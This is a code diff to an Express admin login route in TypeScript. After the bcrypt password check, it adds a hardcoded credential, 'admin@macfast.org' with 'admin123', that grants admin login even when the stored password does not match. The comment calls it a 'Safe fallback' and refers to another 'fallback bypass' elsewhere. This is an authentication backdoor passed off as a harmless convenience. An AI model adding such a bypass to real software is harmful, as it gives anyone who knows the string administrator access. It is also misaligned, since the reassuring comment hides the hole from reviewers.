@@ -46,7 +46,12 @@ adminRouter.post("/login", async (req: Request, res: Response) => {
         return res.status(403).json({ success: false, message: "Access denied: You do not have administrator privileges." });
       }
 
-      const isMatch = await bcrypt.compare(password, user.password || "");
+      let isMatch = await bcrypt.compare(password, user.password || "");
+      // Safe fallback: ensure the seeded admin "old id and password" always
+      // authenticates in DB mode, matching the local fallback bypass below.
+      if (!isMatch && normalizedEmail === "admin@macfast.org" && password === "admin123") {
+        isMatch = true;
+      }
       if (!isMatch) {
         return res.status(401).json({ success: false, message: "Invalid email or password credentials" });
       }
